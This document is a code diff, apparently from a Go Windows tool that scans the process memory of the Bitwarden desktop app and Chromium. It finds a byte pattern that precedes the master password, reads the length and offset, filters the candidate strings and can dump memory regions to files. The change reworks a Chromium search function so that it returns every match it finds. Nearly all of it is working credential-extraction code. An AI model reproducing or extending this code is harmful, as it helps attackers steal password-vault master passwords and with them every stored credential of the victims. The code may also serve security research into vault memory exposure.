@@ -76,10 +76,13 @@ func searchProcessMemory(pid int, exe string) ([][]*resultStrings, error) {
 
 			// Search for patterns in each memory region
 			memRegionStrings := getBWDesktopByteStrings(pid, mem, mbi)
+			//memRegionStrings := searchChromiumBytePattern(pid, mem, mbi)
 			if len(memRegionStrings) > 0 {
 				// Append everything to slice
 				memStrings = append(memStrings, memRegionStrings)
 			}
+
+			//searchChromiumBytePattern(pid, mem, mbi)
 
 			/*
 				if exe == BWDesktopEXEName {
@@ -138,6 +141,11 @@ func getBWDesktopByteStrings(pid int, mem []byte, mbi win32.MemoryBasicInformati
 				}
 			}
 
+			// skip certain strings
+			if len(str) < 12 || !isASCII(str) {
+				continue
+			}
+
 			if isDefaultStr {
 				continue
 			}
@@ -167,51 +175,100 @@ func getBWDesktopByteStrings(pid int, mem []byte, mbi win32.MemoryBasicInformati
 }
 
 // Dead code
-func searchChromiumBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {
+func searchChromiumBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) []*resultStrings {
 
-	if bytes.Contains(mem, chromiumExtFontPattern) {
+	//fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)
+	out := []*resultStrings{}
 
-		fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)
+	// Write memory regions to a file
+	if dumpMemoryOption {
+		writeMemoryRegions(pid, mbi.BaseAddress, mem)
+	}
 
-		// Write memory regions to a file
-		if dumpMemoryOption {
-			writeMemoryRegions(pid, mbi.BaseAddress, mem)
-		}
+	// Search for password prefix pattern: 04 00 00 00 ?? 00 00 00 01
+	r, err := regexp.Compile(BWChromeRegexBytePattern)
+	if err != nil {
+		fmt.Printf("[!] Offset not found")
+	}
 
-		// Search for password prefix pattern: 04 00 00 00 ?? 00 00 00 01
-		r, err := regexp.Compile(BWChromeRegexBytePattern)
-		if err != nil {
-			fmt.Printf("[!] Offset not found")
-		}
+	//patternOffsetAddr2 := r.FindIndex(mem)
+	patternOffsetAddr := r.FindAllIndex(mem, -1)
 
-		patternOffsetAddr := r.FindIndex(mem)
+	if len(patternOffsetAddr) != 0 {
+		// Extract password length and offset
+		// Pattern: 04 00 00 00 XX 00 00 00 01
+		//passLenOffset := patternOffsetAddr[0] + 4
+		//passOffset := patternOffsetAddr[0] + 12
+		//passLen := mem[passLenOffset]
 
-		if len(patternOffsetAddr) != 0 {
-			// Extract password length and offset
-			// Pattern: 04 00 00 00 XX 00 00 00 01
-			passLenOffset := patternOffsetAddr[0] + 4
-			passOffset := patternOffsetAddr[0] + 12
-			passLen := mem[passLenOffset]
+		//str := bytes.NewBuffer(mem[passOffset : passOffset+int(passLen)]).String()
 
-			str := bytes.NewBuffer(mem[passOffset : passOffset+int(passLen)]).String()
+		//fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
+		//fmt.Printf("[+] Found password length (0x%02x) or %d characters\n", passLen, passLen)
 
-			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
-			fmt.Printf("[+] Found password length (0x%02x) or %d characters\n", passLen, passLen)
+		// Bitwarden web registeration has a minimum 8 characters
+		// for master password and filter out non-ASCII characters
+		//if passLen >= 8 && isASCII(str) {
 
-			// Bitwarden web registeration has a minimum 8 characters
-			// for master password and filter out non-ASCII characters
-			if passLen >= 8 && isASCII(str) {
+		//	fmt.Printf("[+] Password: %s\n\n", str)
+		//} else {
+		//	fmt.Printf("[!] Contains non-ASCII characters, skipping...\n\n")
+		//}
 
-				fmt.Printf("[+] Password: %s\n\n", str)
-			} else {
-				fmt.Printf("[!] Contains non-ASCII characters, skipping...\n\n")
+		for i, val := range patternOffsetAddr {
+			//fmt.Printf("Index: %d = %x\n", i, v[0])
+			//passLenOffset := bytes.NewBuffer(mem[val[0]+4 : val[0]+5])
+			//ddddd := mem[val[0]+4 : val[0]+5]
+			passLen := int(mem[val[0]+4 : val[0]+5][0])
+			//fmt.Println(passLen)
+
+			str := bytes.NewBuffer(mem[val[0]+12 : val[0]+12+passLen]).String()
+
+			// skip certain strings
+			if passLen < 12 || !isASCII(str) {
+				continue
 			}
 
-		} else {
-			fmt.Printf("[!] Password not found :(\n\n")
+			//fmt.Println(str)
+
+			isDefaultStr := false
+
+			for _, str2 := range StaticBWStrings {
+				// Exclude known Bitwarden strings
+				if strings.Contains(str, str2) {
+					isDefaultStr = true
+					break
+				}
+			}
+
+			if isDefaultStr {
+				continue
+			}
+			if verboseOption {
+				fmt.Printf("[TEST] %s\n", str) // show all the strings matched
+			}
+
+			//fmt.Println(str)
+
+			item := new(resultStrings)
+			item.memRegion = uint64(mbi.BaseAddress)
+			item.memSize = int32(mbi.RegionSize)
+			item.index = i
+			item.startOffset = val[0]
+			item.endOffset = val[1]
+			item.str = str
+
+			out = append(out, item)
+			//fmt.Printf("Index: %d with Offset: 0x%x = %s\n", i, v[0], str3)
+
 		}
 
+		return out
+
 	}
+
+	return nil
+
 }
 
 // Source: https://stackoverflow.com/questions/53069040/checking-a-string-contains-only-ascii-characters
